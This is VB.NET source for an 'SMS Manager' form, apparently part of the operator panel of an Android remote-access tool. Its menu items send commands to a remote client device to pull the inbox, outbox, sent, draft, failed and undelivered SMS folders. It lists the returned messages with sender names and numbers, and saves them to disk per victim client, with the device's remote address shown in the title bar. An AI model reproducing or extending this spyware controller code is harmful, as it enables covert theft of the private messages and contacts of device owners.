Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices


Public Class SMS_Manager
    Private imageList_0 As ImageList
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public pathSMS As String
    Private Find_Name As Boolean
    Public Sub New()
        Me.imageList_0 = New ImageList()
        Me.Find_Name = False
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.Label1.Text = array(0)
                    Dim flag3 As Boolean = Not Me.Panel3.Visible
                    If flag3 Then
                        Me.Panel3.Visible = True
                    End If
                Else
                    Me.DataGridView1.Rows.Clear()
                    Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Line}
                    Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                    Dim stringBuilder As StringBuilder = New StringBuilder()
                    Dim num As Integer = array2.Length - 1
                    For i As Integer = 0 To num
                        Dim separator3 As String() = New String() {My.Forms.Form1.s.split_Ary}
                        Dim array3 As String() = array2(i).Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                        Dim index As Integer = Me.imageList_0.Images.IndexOfKey("sms".ToUpper())
                        Dim flag4 As Boolean = array3.Length = 7
                        If flag4 Then
                            Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(index), array3(0), array3(1), array3(2), array3(3)})
                            stringBuilder.AppendFormat("{0}", String.Concat(New String() {array3(0), vbCrLf, array3(1), vbCrLf, array3(2), vbCrLf, array3(4), vbCrLf & "##---End---##" & vbCrLf}))
                            Me.DataGridView1.Rows(Me.DataGridView1.Rows.Count - 1).Tag = array3(4)
                            Me.DataGridView1.Rows(Me.DataGridView1.Rows.Count - 1).Cells(1).Tag = array3(5)
                            Me.pathSMS = array3(6)
                        End If
                    Next
                    stringBuilder.AppendFormat("{0}", "## " + Me.pathSMS + " ##" & vbCrLf)
                    store_0.Save_0(Me.Name_Client + Me.Client_ID + "\SMS_Manager", stringBuilder.ToString())
                    Dim visible As Boolean = Me.Panel3.Visible
                    If visible Then
                        Me.Panel3.Visible = False
                    End If
                    Me.refres_title()
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("SMS Manager {4} - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", New Object() {Me.Client_remote_Address, Me.Name_Client, Conversions.ToString(Me.DataGridView1.Rows.Count), Conversions.ToString(Me.DataGridView1.SelectedRows.Count), Me.pathSMS})
        Me.Text = text
    End Sub

    Private Sub SMS_Manager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Dim flag As Boolean = False
        Dim files As String() = Directory.GetFiles(Application.StartupPath + "\" + store_0.name_folder_app_resource + "\icons\sms_manager\")
        For Each text As String In files
            Dim flag2 As Boolean = Not flag
            If flag2 Then
                Me.icon_0.Width = Image.FromFile(text).Size.Width
                Me.imageList_0.ImageSize = New Size(Image.FromFile(text).Size.Width, Image.FromFile(text).Size.Height)
                Me.imageList_0.ColorDepth = ColorDepth.Depth32Bit
                flag = True
            End If
            Dim path As String = text
            Dim fileNameWithoutExtension As String = IO.Path.GetFileNameWithoutExtension(path)
            Me.imageList_0.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text))
        Next
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        Me.refres_title()
    End Sub

    Private Sub InboxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InboxToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sms_manager", My.Forms.Form1.s.SplitData, "content://sms/inbox", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.Find_Name)}))
    End Sub

    Private Sub OutboxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OutboxToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sms_manager", My.Forms.Form1.s.SplitData, "content://sms/outbox", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.Find_Name)}))
    End Sub

    Private Sub SentToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SentToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sms_manager", My.Forms.Form1.s.SplitData, "content://sms/sent", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.Find_Name)}))
    End Sub

    Private Sub FailedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FailedToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sms_manager", My.Forms.Form1.s.SplitData, "content://sms/failed", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.Find_Name)}))
    End Sub

    Private Sub DraftToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DraftToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sms_manager", My.Forms.Form1.s.SplitData, "content://sms/draft", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.Find_Name)}))
    End Sub

    Private Sub UndeliveredToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UndeliveredToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sms_manager", My.Forms.Form1.s.SplitData, "content://sms/undelivered", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.Find_Name)}))
    End Sub

    Private Sub All0ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles All0ToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"sms_manager", My.Forms.Form1.s.SplitData, "content://sms/", My.Forms.Form1.s.SplitData, Conversions.ToString(Me.Find_Name)}))
    End Sub

    Private Sub DataGridView1_CellMouseDoubleClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseDoubleClick
        Dim flag As Boolean = e.RowIndex >= 0 AndAlso e.ColumnIndex >= 0
        If flag Then
            Dim flag2 As Boolean = Me.DataGridView1.SelectedRows.Count = 1
            If flag2 Then
                Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
                For i As Integer = num To 0 Step -1
                    Dim str As String = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Tag)
                    Dim num2 As Integer = Me.handle_Number_Client
                    Dim editor_sms As editor_sms = CType(My.Application.OpenForms("editor_sms" + str), editor_sms)
                    Dim flag3 As Boolean = editor_sms Is Nothing
                    If flag3 Then
                        editor_sms = New editor_sms()
                        editor_sms.Client_remote_Address = Me.Client_remote_Address
                        editor_sms.handle_Number_Client = num2
                        editor_sms.Name_Client = Me.Name_Client
                        editor_sms.sender_name = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(2).Value)
                        editor_sms.sender_number = Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)
                        editor_sms.Name = "editor_sms" + str
                        editor_sms.Show()
                    Else
                        Dim flag4 As Boolean = editor_sms.WindowState = FormWindowState.Minimized
                        If flag4 Then
                            editor_sms.WindowState = FormWindowState.Normal
                        End If
                        Dim flag5 As Boolean = Not editor_sms.ContainsFocus
                        If flag5 Then
                            editor_sms.Focus()
                        End If
                    End If
                    editor_sms.editor_sms_00(Conversions.ToString(Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Tag))
                    Dim index As Integer = Me.imageList_0.Images.IndexOfKey("smsopen".ToUpper())
                    Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(0).Value = Me.imageList_0.Images(index)
                Next
            End If
        End If
    End Sub
    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        Dim checked As Boolean = Me.ShowToolStripMenuItem.Checked
        If checked Then
            Me.ShowToolStripMenuItem.Checked = False
            Me.HideToolStripMenuItem.Checked = True
            Me.Find_Name = False
        End If
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        Dim checked As Boolean = Me.HideToolStripMenuItem.Checked
        If checked Then
            Dim flag As Boolean = MessageBox.Show("Show name takes some time Do you want to continue?", store_0.name_prog, MessageBoxButtons.YesNo) = DialogResult.Yes
            If flag Then
                Me.HideToolStripMenuItem.Checked = False
                Me.ShowToolStripMenuItem.Checked = True
                Me.Find_Name = True
            End If
        End If
    End Sub
End Class